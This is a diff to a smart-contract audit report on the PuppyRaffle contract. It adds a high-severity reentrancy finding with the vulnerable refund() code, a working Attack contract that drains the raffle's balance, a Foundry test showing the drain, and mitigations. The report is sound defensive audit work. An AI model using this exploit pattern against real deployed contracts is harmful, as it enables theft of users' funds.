@@ -44,7 +44,7 @@ Lead Auditors:
 - [Findings](#findings)
 - [High](#high)
     - [\[S-#\] Title (ROOT CAUSE + IMPACT)](#s--title-root-cause--impact)
-    - [\[S-#\] Title (ROOT CAUSE + IMPACT)](#s--title-root-cause--impact-1)
+    - [\[H-#\] The reset of the `PuppyRaffle::players[playerIndex]` array happens after the external call `PuppyRaffle::sendValue()` which leads to a reentancy situation.](#h--the-reset-of-the-puppyraffleplayersplayerindex-array-happens-after-the-external-call-puppyrafflesendvalue-which-leads-to-a-reentancy-situation)
 - [Medium](#medium)
 - [Low](#low)
 - [Informational](#informational)
@@ -160,15 +160,111 @@ function testDoSAttack() public {
 
 **Recommended Mitigation:** 
 
-### [S-#] Title (ROOT CAUSE + IMPACT)
+### [H-#] The reset of the `PuppyRaffle::players[playerIndex]` array happens after the external call `PuppyRaffle::sendValue()` which leads to a reentancy situation.
 
-**Description:** 
+**Description:** In the function `PuppyRaffle::refund()` the array which stores the active users (i.e. those who have not yet refunded their `PuppyRaffle::entranceFee`) is updated after the external call `PuppyRaffle::sendValue()`. In that case a user might implement a malicious contract that would reenter the `PuppyRaffle::refund()` after receiving the entrance fee and clear out the contract's balance.
 
-**Impact:** 
+Contract Code: 
+```soliditiy
+    function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
 
-**Proof of Concept:**
+@>      payable(msg.sender).sendValue(entranceFee);
 
-**Recommended Mitigation:** 
+@>      players[playerIndex] = address(0);
+        emit RaffleRefunded(playerAddress);
+    }
+
+```
+
+**Impact:** That particulat reentrancy attack could result in a complete loss of the funds stored in the `PuppyRaffle` contract. 
+
+**Proof of Concept:** 
+1. Create a Contract that will exploit the vulnerability:
+
+```solidity
+contract Attack {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle){
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    } 
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    receive() external payable {
+        if(address(puppyRaffle).balance >= entranceFee){
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+}
+```
+
+2. Create a testcase to check whether the aforementioned contract was able to successfully exploit:
+
+The `PuppyRaffleTest.t.sol::testCanReenter()` function tests the PuppyRaffle contract's vulnerability to a reentrancy attack by simulating an attack scenario. It involves creating an attacker contract that exploits the refund function, checking the contract's balances before and after the attack to assess the impact.
+
+```solidity
+function testCanReenter() public playerEntered {
+        address[] memory players = new address[](4);
+        players[0] = address(10);
+        players[1] = address(11);
+        players[2] = address(12);
+        players[3] = address(13);
+
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        Attack attackerContract = new Attack(puppyRaffle);
+        address attackerUser = makeAddr("attackerUser");
+        vm.deal(attackerUser, 1 ether);
+
+        uint256 startAttackerContractBalance = address(attackerContract).balance;
+        uint256 startPuppyRaffleContractBalance = address(puppyRaffle).balance;
+
+        vm.prank(attackerUser);
+        attackerContract.attack{value: entranceFee}();
+
+        console.log("Attacker Balance start: ", startAttackerContractBalance);
+        console.log("PuppyRaffle Balance start: ", startPuppyRaffleContractBalance);
+        
+        console.log("Attacker Contract balance after attack: ", address(attackerContract).balance);
+        console.log("PuppyRaffle Contract balance after attack: ", address(puppyRaffle).balance);
+    }
+```
+
+**Recommended Mitigation:** To mitigate the reentrancy risk in the `PuppyRaffle::refund()` function, consider the following recommendations:
+
+1. *Update State Before External Calls*: Move the state update (`players[playerIndex] = address(0);`) before the external call (`payable(msg.sender).sendValue(entranceFee);`). This ensures that the contract's state is updated before any external calls are made, reducing the risk of reentrancy.
+
+```diff
+    function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
++       players[playerIndex] = address(0);
+        payable(msg.sender).sendValue(entranceFee);
+
+-       players[playerIndex] = address(0);
+        emit RaffleRefunded(playerAddress);
+    }
+
+```
+
+2. *Use Reentrancy Guards*: Implement a reentrancy guard, such as the `nonReentrant` modifier from OpenZeppelin's `ReentrancyGuard` contract, to prevent reentrant calls. This modifier can be applied to functions that are susceptible to reentrancy attacks.
+
+3.  *Consider Using Pull Over Push Payments*: Instead of sending funds directly to the user within the `refund` function, consider implementing a system where users can withdraw their funds. This approach can help mitigate reentrancy risks by separating the state update from the external call.
+
 
 # Medium
 # Low 
